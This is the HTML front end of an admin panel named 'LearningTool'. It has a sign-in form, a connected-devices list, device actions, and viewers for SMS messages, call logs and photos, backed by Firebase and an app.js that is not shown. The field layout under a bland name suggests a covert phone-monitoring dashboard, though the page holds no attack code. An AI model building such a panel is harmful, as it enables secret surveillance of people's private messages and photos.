<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LearningTool Admin Panel</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background-color: #f4f4f4; }
        .container { max-width: 1200px; margin: auto; background: white; padding: 20px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
        .auth-section { margin-bottom: 20px; text-align: center; }
        .auth-section input { padding: 10px; margin: 5px; width: 250px; }
        .auth-section button { padding: 10px 20px; margin: 5px; cursor: pointer; }
        .user-info { font-weight: bold; }
        .device-list { margin-top: 20px; }
        .device-card { border: 1px solid #ccc; padding: 15px; margin-bottom: 10px; border-radius: 5px; }
        .device-card h4 { margin: 0 0 10px 0; }
        .online { color: green; font-weight: bold; }
        .offline { color: red; font-weight: bold; }
        .controls { display: flex; flex-wrap: wrap; gap: 10px; margin-top: 10px; }
        .controls button { padding: 10px; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 5px; }
        .data-viewer { margin-top: 20px; }
        .data-viewer h3 { border-bottom: 2px solid #ccc; padding-bottom: 10px; }
        .data-list { max-height: 300px; overflow-y: auto; border: 1px solid #eee; padding: 10px; background-color: #fff; }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <h1>LearningTool Admin Panel</h1>
            <div class="auth-status">
                <span id="user-info" class="user-info">Not signed in.</span>
                <button id="sign-out-btn" style="display:none;">Sign Out</button>
            </div>
        </div>

        <div id="auth-ui" class="auth-section">
            <h2>Sign In</h2>
            <input type="email" id="email-input" placeholder="Email" />
            <input type="password" id="password-input" placeholder="Password" />
            <button id="sign-in-btn">Sign In</button>
        </div>

        <div id="main-ui" style="display:none;">
            <div class="device-list">
                <h2>Connected Devices</h2>
                <div id="devices"></div>
            </div>

            <hr/>

            <div class="data-viewer">
                <h2>Device Actions</h2>
                <p>Select a device from the list above to perform actions.</p>
                <div id="device-controls"></div>
            </div>

            <hr/>

            <div class="data-viewer">
                <h3>SMS Messages</h3>
                <div id="sms-log" class="data-list"></div>
            </div>

            <hr/>

            <div class="data-viewer">
                <h3>Call Logs</h3>
                <div id="call-log" class="data-list"></div>
            </div>
            
            <hr/>

            <div class="data-viewer">
                <h3>Photos</h3>
                <div id="photo-log" class="data-list"></div>
            </div>
        </div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-storage.js"></script>

    <script src="app.js"></script>

</body>
</html>
